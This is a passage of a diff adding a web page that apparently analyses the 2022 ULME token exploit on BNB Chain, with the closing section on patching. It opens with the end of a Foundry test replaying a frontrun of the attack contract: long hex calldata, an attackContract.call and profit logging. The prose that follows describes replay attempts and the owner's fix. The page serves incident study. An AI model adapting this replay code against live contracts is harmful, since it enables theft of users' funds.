bc190000000000000000000000000dceb637e38dbae685222eef6635095aaaec6549600000000000000000000000036083aac533353317c24bd53227dbf29ed9f384c00000000000000000000000094913f31fbafcb0ae6e5efa4c18e3ee301097eab000000000000000000000000188c50f43f9fa0026baaa7d8cf83c358311f05000000000000000000000000003d8dcc70777643612564d84176f769a1417987a500000000000000000000000000273ceee956543c801429a886cd0e1a79f5d8ca000000000000000000000000c43c5f785d06b582e3e710dc0156267fd135c6020000000000000000000000000406aefd83f20700d31a49f3d6fdbf52e8f7d0ef000000000000000000000000bed8c7433de90d349f96c6ae82d4eb4482aa6bf7000000000000000000000000de436f7742ce08f843f8d84e7998e0b7e4b73101000000000000000000000000d38c6e26aa4888de59c2eaad6138b0b66abbf21d000000000000000000000000c0dfb3219f0c72e902544a080ba0086da53f9599000000000000000000000000faad61bd6b509145c2988b03529ff21f3c9970b20000000000000000000000009f9beef87cfe141868e21eacbddb48df6c54c2f20000000000000000000000006614e2e86b4646793714b1fa535fc5875bb446d50000000000000000000000007efe3780b1b0cde8f300443fbb4c12a73904a948000000000000000000000000ad813b95a27233e7abd92c62bba87f59ca8f933900000000000000000000000013f33854ce08e07d20f5c0b16884267dde21a50100000000000000000000000059ebcde7ec542b5198095917987755727725fd1d000000000000000000000000e5a5b86119bd9fd4df5478abe1d3d9f46bf3ba5f000000000000000000000000c2724ed2b629290787eb4a91f00aafe58f262025000000000000000000000000dfa225eb03f9cc2514361a044edda777ea51b9ad00000000000000000000000085d981e3cddb402f9ae96948900971102ee5d6b5000000000000000000000000b0ac3a88bfc919ca189f7d4aba8e2f191b37a65b0000000000000000000000001a906a9a385132d6b1a62bb8547fd20c38dd79bb0000000000000000000000009d36c7c400e033aeac391b24f47339d7cb7bc0330000000000000000000000005b19c1f57b227c67bef1e77b1b6796ef22aee21b000000000000000000000000bfd0785a924c3547544c95913dac0b119865df9e000000000000000000000000f003e6430fbc1194ffa3419629a389b7c113f083000000000000000000000000fa30cd705ee0908e2dac4c19575f824ded99818e000000000000000000000000e27027b827fe2fbcfcb56269d4463881aa6b8955000000000000000000000000eddd7179e461f42149104dcb87f3b5b657a05399000000000000000000000000980fcdb646c674ff9b6621902acb8a40129740930000000000000000000000002ebc77934935980357a894577c2cc7107574f971000000000000000000000000798435de8fa75993bfc9ad84465d7f812507b6040000000000000000000000001be117f424e9e6f845f7b07c072c1d67f114f885000000000000000000000000434e921bdfe74605bd2aabc2f6389ddba2d37aca000000000000000000000000afacac64426d1ce0512363338066cc8cabb3aea20000000000000000000000002693e0a37ea6e669ab43df6ee68b453f6d6f3ebd00000000000000000000000077aee2aac9881f4a4c347eb94ded088ad49c574d000000000000000000000000951f4785a2a61fe8934393e0ff6513d6946d8d970000000000000000000000002051ce514801167545e74b5dd2a8cf5034c6b17b000000000000000000000000c2ee820756d4074d887d762fd8f70c4fc47ab47f00000000000000000000000000000000000000000000000000000000000000412205f5d1bca99609787803dd8694d8acf0bcb45f62c338300ad96faaca07491403e7612cf8cb1a59e0785f9d3cf2f5fc1e422c5f1afa9a908adea1e47f70fe481b00000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="p">;</span>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="w">    </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>attackContract<span class="p">.</span>call<span class="p">(</span>data<span class="p">);</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="w">    </span><span class="kt">require</span><span class="p">(</span>success<span class="p">,</span><span class="w"> </span><span class="s2">&quot;frontrun failed&quot;</span><span class="p">);</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Totol profit&quot;</span><span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>balanceOf<span class="p">(</span>attacker<span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>balance0<span class="p">,</span><span class="w"> </span>usdt<span class="p">.</span>decimals<span class="p">());</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="w">    </span>vm<span class="p">.</span>stopPrank<span class="p">();</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>However, using the above code for testing, it can still be easily detected as profitable by bots.</p>
+<p>After the AttackTx, subsequent <a href="https://bscscan.com/tx/0x53f9a6246549a334475353cd235cf5934f8f9f0bd84f30788d0b8afa2cc8ba6a">another call</a> to the attack contract were also made, but it resulted in reverts due to signature verification failures, indicating an attempt to replay the attack (though it was too late, as the vulnerability had already been "fixed").</p>
+<p><img alt="Frontrunning Protection" src="../../image/221025_ULME.assets/0130.png" /></p>
+<h3 id="patch">Patch</h3>
+<p>The token contract is not a proxy contract, but it appears that people are still trading it to this day, indicating that the vulnerability has likely been fixed. However, it's clear that the <code>buyMiner</code> function cannot be altered and can still be called by anyone.</p>
+<p>Attempting to call the <code>buyMiner</code> function after the most recent blockchain fork results in a revert.</p>
+<p><img alt="Patch" src="../../image/221025_ULME.assets/4803.png" /></p>
+<p>The original <code>transferFrom</code> should have transferred USDT from the specified address to the ULME contract. However, it is evident that the USDT contract address has been changed. Checking this <a href="https://bscscan.com/address/0xE2DfbD558D8F5559CAe0886Ad14009589D6F0Bc6">0xE2Df</a> address reveals that the contract was created by the owner approximately 4 hours after the attack occurred.</p>
+<p><img alt="Patch" src="../../image/221025_ULME.assets/3025.png" /></p>
+<p>Upon decompilation, it is evident that this contract does not provide the <code>transferFrom</code> function. Consequently, calling the <code>buyMiner</code> function will result in a revert, rendering the vulnerability function unusable.</p>
+<p><img alt="Patch" src="../../image/221025_ULME.assets/5445.png" /></p>
+<p>The <a href="https://bscscan.com/tx/0xbc4847851dcddb0e38f830e2edc423b176b4c1270dc2400d0385566676aa1424">patch transaction</a> can be seen below.</p>
+<p><img alt="Patch Transaction" src="../../image/221025_ULME.assets/3303.png" /></p>
+<p><img alt="Patch Transaction" src="../../image/221025_ULME.assets/5649.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Home">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Home
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../221129_MBC/" class="md-footer__link md-footer__link--next" aria-label="Next: 221129-MBC-ZZSH">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                221129-MBC-ZZSH
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer", "content.code.copy", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+    
+  </body>
+</html>
